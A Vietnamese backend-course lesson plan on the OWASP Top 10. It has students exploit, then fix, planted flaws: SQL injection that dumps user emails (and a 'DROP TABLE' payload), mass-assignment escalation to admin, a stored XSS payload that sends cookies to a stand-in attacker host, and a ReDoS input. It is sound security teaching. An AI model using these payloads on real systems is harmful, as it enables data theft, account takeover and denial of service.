# Buổi 22 — Bảo mật: OWASP Top 10 thực chiến

> **Phase 3** · Backend chuyên sâu
> **Mục tiêu:** Tự tay khai thác rồi tự vá các lỗ hổng phổ biến nhất — nhớ lâu hơn nhiều so với đọc lý thuyết.
> **Code thực hành:** [`src/demo-owasp.js`](../../code/project-02-ecommerce/src/demo-owasp.js)

---

## Dòng thời gian 180 phút

| Thời gian | Nội dung |
|---|---|
| 0–15′ | Chữa bài tập buổi 21 |
| 15–60′ | **SQL Injection: tự khai thác** |
| 60–90′ | **Mass assignment: tự nâng quyền thành admin** |
| 90–115′ | XSS lưu trữ qua API |
| 115–145′ | **ReDoS — làm sập server bằng 29 ký tự** |
| 145–170′ | Rò rỉ thông tin, `npm audit` |
| 170–180′ | Bảng đối chiếu OWASP Top 10 |

> **📝 Ghi chú giảng viên**
> Buổi này chạy theo mô hình **khai thác → hiểu → vá**. Học viên phải **tự gõ và tự chạy** đoạn tấn công. Đọc về SQL injection thì quên; nhìn email của chính mình bị dump ra màn hình thì nhớ đời.
>
> Nhắc trước với lớp: mọi lỗ hổng ở đây được cài **có chủ đích** để học. Kỹ thuật này chỉ dùng trên hệ thống của chính mình.

---

## 1. SQL Injection (15–60′)

### 1.1. Khai thác

```js
/** ❌ Ghép chuỗi vào SQL */
return prisma.$queryRawUnsafe(
  `SELECT id, ten, "giaVND" FROM san_phams WHERE ten LIKE '%${tuKhoa}%'`
);
```

Kẻ tấn công gõ vào **ô tìm kiếm sản phẩm**:

```
' UNION SELECT id, email, 0 FROM users --
```

Kết quả thật:

```
  Kết quả từ hàm CÓ LỖ HỔNG:
     id=28   Tai nghe
     id=29   Sạc nhanh
     id=538  an@shop.com
     id=539  binh@shop.com
     id=537  admin@shop.com
  → 🚨 TOÀN BỘ EMAIL NGƯỜI DÙNG BỊ LỘ
```

Phân tích câu SQL sau khi ghép — **viết lên bảng**:

```sql
SELECT id, ten, "giaVND" FROM san_phams WHERE ten LIKE '%' UNION SELECT id, email, 0 FROM users --%'
                                                     └─ đóng chuỗi ─┘└──── câu lệnh của kẻ tấn công ────┘└─ comment ─┘
```

> Dấu `'` đóng chuỗi sớm, `UNION` nối thêm một truy vấn khác, `--` biến phần còn lại thành ghi chú.
>
> Và đây mới chỉ là **đọc**. Với quyền ghi, `; DROP TABLE users; --` xoá sạch dữ liệu.

### 1.2. Cách vá

```js
/** ✅ Tham số hoá */
return prisma.$queryRaw`
  SELECT id, ten, "giaVND" FROM san_phams WHERE ten LIKE ${'%' + tuKhoa + '%'}
`;
```

```
  Kết quả từ hàm AN TOÀN: 0 dòng
  → ✅ Chuỗi độc bị coi là DỮ LIỆU tìm kiếm, không phải LỆNH
```

**Vì sao tham số hoá an toàn?**

> Database nhận **câu lệnh** và **dữ liệu** qua **hai đường riêng**. Câu lệnh đã được biên dịch xong **trước khi** dữ liệu tới — nên dữ liệu không thể trở thành lệnh, dù chứa ký tự gì.
>
> Đây **không phải** chuyện "escape ký tự đặc biệt". Escape bằng tay luôn sót. Tham số hoá là giải pháp **cấu trúc**.

### 1.3. Hai chi tiết học viên hay hiểu sai

**(a) "Dùng ORM là miễn nhiễm"** — **Sai.**

| An toàn | Nguy hiểm |
|---|---|
| `prisma.sanPham.findMany({ where })` | `prisma.$queryRawUnsafe(chuoi)` |
| ``prisma.$queryRaw`... ${x}` `` (backtick) | `$executeRawUnsafe` |

> Chỉ cần **một** chỗ dùng `Unsafe` với dữ liệu người dùng là đủ. Hãy `grep` toàn dự án tìm `Unsafe` — bài tập số 1.

**(b) "Chỉ ô tìm kiếm mới nguy hiểm"** — **Sai.** Mọi dữ liệu từ ngoài đều nguy hiểm: query string, header, cookie, tên file upload, dữ liệu từ API bên thứ ba.

---

## 2. Mass Assignment (60–90′)

### 2.1. Khai thác

```js
/** ❌ Nhận thẳng body của client */
return prisma.user.update({ where: { id: userId }, data: body });
```

An là khách hàng bình thường. Anh ta gửi lên:

```json
{ "ten": "An", "vaiTro": "admin" }
```

```
  Vai trò của An trước: khach
  Hàm CÓ LỖ HỔNG  → vai trò: admin  🚨 TỰ NÂNG QUYỀN THÀNH ADMIN
  Hàm AN TOÀN     → vai trò: khach  ✅ trường lạ bị bỏ qua
```

### 2.2. Ba lớp phòng thủ

```js
// Lớp 1 — zod .strict(): TỪ CHỐI ngay ở cửa (buổi 11)
const schema = z.object({ ten: z.string() }).strict();

// Lớp 2 — danh sách trắng ở service
data: { ten: body.ten }        // ✅ liệt kê rõ
data: body                     // ❌ không bao giờ
data: { ...body }              // ❌ spread cũng không

// Lớp 3 — trường nhạy cảm chỉ đổi được qua endpoint riêng của admin, có ghi log
```

> **📝 Ghi chú giảng viên**
> Hỏi lớp: *"Trong dự án của bạn, những trường nào KHÔNG BAO GIỜ được để client sửa?"*
>
> Danh sách điển hình: `id`, `vaiTro`, `soDu`, `daThanhToan`, `trangThai`, `taoLuc`, `userId`, `giaVND`.
>
> Nhắc lại buổi 16: `tacGiaId` phải lấy **từ token**, không từ body. Cùng một lỗ hổng, hai biểu hiện.

---

## 3. XSS lưu trữ qua API (90–115′)

Kẻ tấn công đặt **tên sản phẩm** là:

```html
<img src=x onerror="fetch('https://ke-tan-cong.com?c='+document.cookie)">
```

API trả về nguyên văn chuỗi đó cho **mọi** người xem. Nếu frontend render bằng `innerHTML` / `v-html` / `dangerouslySetInnerHTML` → script chạy trên trình duyệt của **mọi khách hàng** → mất cookie.

> **⚠️ "Frontend lo XSS" là câu trả lời SAI.**
>
> XSS là lỗ hổng của tầng hiển thị, nhưng backend **vẫn có trách nhiệm**:
>
> | Biện pháp | Buổi |
> |---|---|
> | Giới hạn độ dài và ký tự cho phép (zod) | 11 |
> | Làm sạch HTML nếu trường đó cho phép HTML — **dùng thư viện, đừng tự viết** | 22 |
> | Header `Content-Security-Policy` | 23 |
> | Trả `Content-Type: application/json`, **không bao giờ** `text/html` | 04 |
>
> **Phòng thủ phải theo tầng.** Không tầng nào được phép nói "tầng kia lo".

> **📝 Ghi chú giảng viên**
> Học viên là frontend dev — họ **biết** XSS. Điểm mới với họ là **trách nhiệm của backend**. Hãy hỏi: *"Nếu frontend đã escape hết rồi thì backend còn cần làm gì?"* → còn app mobile, còn API cho đối tác, còn export ra Excel/PDF, còn email HTML.

---

## 4. ReDoS — làm sập server bằng 29 ký tự (115–145′)

> **📝 Ghi chú giảng viên — phần gây sốc nhất buổi học**

```js
const regexXau = /^(a+)+$/;
const chuoiDoc = 'a'.repeat(28) + 'b';   // 29 ký tự
regexXau.test(chuoiDoc);
```

Kết quả thật:

```
  Regex:  /^(a+)+$/
  Chuỗi:  "aaaaaaaaaaaaaaaaaaaaaaaaaaaab"  (chỉ 29 ký tự)

  Thời gian khớp: 16154 ms  🚨
```

**16 giây** để khớp một chuỗi 29 ký tự.

> Nối lại buổi 02: regex chạy **đồng bộ**, **chặn Event Loop**. Trong 16 giây đó, server **không trả lời được ai cả**.
>
> Kẻ tấn công chỉ cần gửi vài request như vậy — không cần botnet, không cần băng thông — là server đứng hình hoàn toàn.

**Vì sao?** Nhóm lặp lồng nhau `(a+)+` khiến regex engine thử **mọi cách chia** chuỗi thành các nhóm. Với 28 chữ `a`, số cách chia là **2²⁸**. Chỉ khi thử hết mới kết luận được là không khớp (vì có chữ `b` ở cuối).

Cho học viên thử tăng dần để thấy tăng theo **hàm mũ**:

| số chữ `a` | thời gian |
|---|---|
| 24 | ~1 giây |
| 26 | ~4 giây |
| 28 | ~16 giây |
| 30 | ~64 giây |

**Dấu hiệu regex nguy hiểm — nhóm lặp lồng nhau:**

```
(a+)+     (a*)*     (a|a)*     (\d+)*     ([a-z]+)*
```

**Cách phòng:**
1. Tránh nhóm lặp lồng nhau
2. **Giới hạn độ dài đầu vào TRƯỚC khi chạy regex** — `z.string().max(200)`
3. Dùng thư viện kiểm tra regex an toàn nếu regex do người dùng nhập

> Kiểm tra ngay trong Project 2: regex số điện thoại `/^0\d{9}$/` — có nhóm lặp lồng nhau không? Không. An toàn.

---

## 5. Rò rỉ thông tin & thư viện lỗi thời (145–170′)

### 5.1. Thông báo lỗi

```
Raw query failed. Code: `42P01`. Message: `relation "bang_khong_ton_tai" does not exist`
```

Trả nguyên văn cho client thì kẻ tấn công biết được:
- Hệ quản trị database và **phiên bản**
- Tên bảng, tên cột thật
- Đường dẫn thư mục trên máy chủ (qua stack trace)
- Tên và phiên bản thư viện → **tra lỗ hổng đã công bố**

> Project 2 xử lý đúng từ buổi 18: log đầy đủ cho mình, trả `{ loi: "Lỗi máy chủ nội bộ", requestId }` cho client.

### 5.2. `npm audit`

```bash
npm audit
npm audit fix
npm outdated
```

> **A06 — Vulnerable and Outdated Components.** Phần lớn code trong dự án của bạn là **code người khác viết**. Một lỗ hổng trong thư viện là lỗ hổng của bạn.
>
> Ở buổi 40 (CI/CD), ta cho `npm audit` chạy tự động mỗi lần push — để không phụ thuộc vào việc ai đó nhớ chạy.

---

## 6. Bảng đối chiếu OWASP Top 10 (170–180′)

| Mục | Cách phòng trong khoá học | Đã học ở |
|---|---|---|
| **A01** Broken Access Control | kiểm quyền theo chủ sở hữu ở mọi endpoint | buổi 16 |
| **A02** Cryptographic Failures | bcrypt cost 12, HTTPS, không tự chế mã hoá | buổi 15 |
| **A03** Injection (SQL) | không `$queryRawUnsafe` với input người dùng | buổi 22 |
| **A03** Injection (XSS) | giới hạn input + CSP + `Content-Type` đúng | buổi 22–23 |
| **A04** Insecure Design | zod `.strict()`, danh sách trắng, rate limit | buổi 11, 21 |
| **A05** Security Misconfiguration | helmet, không lộ stack trace | buổi 18, 23 |
| **A06** Vulnerable Components | `npm audit`, cập nhật định kỳ | buổi 22, 40 |
| **A07** Auth Failures | chống dò tài khoản, rate limit, token rotation | buổi 15 |
| **A08** Data Integrity Failures | transaction + khoá dòng, ràng buộc ở DB | buổi 19 |
| **A09** Logging Failures | log có cấu trúc, che dữ liệu, `requestId` | buổi 18 |
| **A10** SSRF | không cho người dùng chỉ định URL server gọi | buổi 24 |

> **Thông điệp chốt buổi:**
>
> **Bảo mật không phải một buổi học.** Bảng trên cho thấy ta đã chạm tới **9/10 mục** mà không cần gọi tên chúng — vì mỗi mục đều là hệ quả tự nhiên của việc viết code cẩn thận.
>
> Buổi hôm nay chỉ gắn **tên gọi** cho những thứ các bạn đã làm đúng, và bổ sung ba thứ chưa gặp: SQL injection, ReDoS, và `npm audit`.

---

## 7. Bài tập về nhà

1. **Quét dự án của bạn.** Chạy `grep -rn "Unsafe" src/` trên Project 2. Mỗi chỗ tìm thấy, xác định dữ liệu có đến từ người dùng không. Viết báo cáo.

2. **Khai thác rồi vá.** Thêm endpoint `GET /san-pham/tim?q=` dùng `$queryRawUnsafe`. Tự khai thác lấy danh sách email. Rồi vá bằng `$queryRaw` và chứng minh khai thác thất bại.

3. **Đo ReDoS theo hàm mũ.** Chạy `/^(a+)+$/` với 20, 22, 24, 26 chữ `a`. Lập bảng thời gian. Xác nhận mỗi lần thêm 2 ký tự thì thời gian **gấp 4**.

4. **Tìm regex nguy hiểm.** Kiểm tra mọi regex trong Project 2 (`zod`, `router`, `validate`). Có cái nào có nhóm lặp lồng nhau không? Nếu không, hãy tự viết một cái nguy hiểm rồi chỉ ra vì sao.

5. **Mass assignment thật.** Thêm endpoint `PATCH /auth/toi` cho phép đổi tên. Cố tình viết `data: req.body`, chứng minh tự nâng quyền được. Rồi vá bằng **cả ba** lớp phòng thủ.

6. **`npm audit`.** Chạy trên Project 2. Nếu có cảnh báo, đọc và giải thích một lỗ hổng: nó cho phép làm gì, dự án của bạn có thật sự bị ảnh hưởng không?

---

## 8. Checklist kết thúc buổi

- [ ] Vì sao tham số hoá an toàn hơn escape ký tự bằng tay?
- [ ] Dùng ORM có miễn nhiễm SQL injection không?
- [ ] Kể 5 trường "không bao giờ để client sửa".
- [ ] Backend có trách nhiệm gì với XSS, dù nó là lỗ hổng tầng hiển thị?
- [ ] Regex nào là nguy hiểm? Nhận biết bằng dấu hiệu gì?
- [ ] Vì sao ReDoS làm sập cả server chứ không chỉ một request?
- [ ] Thông báo lỗi database lộ ra những gì cho kẻ tấn công?
- [ ] `npm audit` giải quyết mục nào trong OWASP Top 10?

---

**Buổi trước:** [Buổi 21 — Redis: cache-aside & rate limit](./buoi-21-redis-cache.md)
**Buổi tiếp theo:** Buổi 23 — CORS, Helmet & Rate limiting
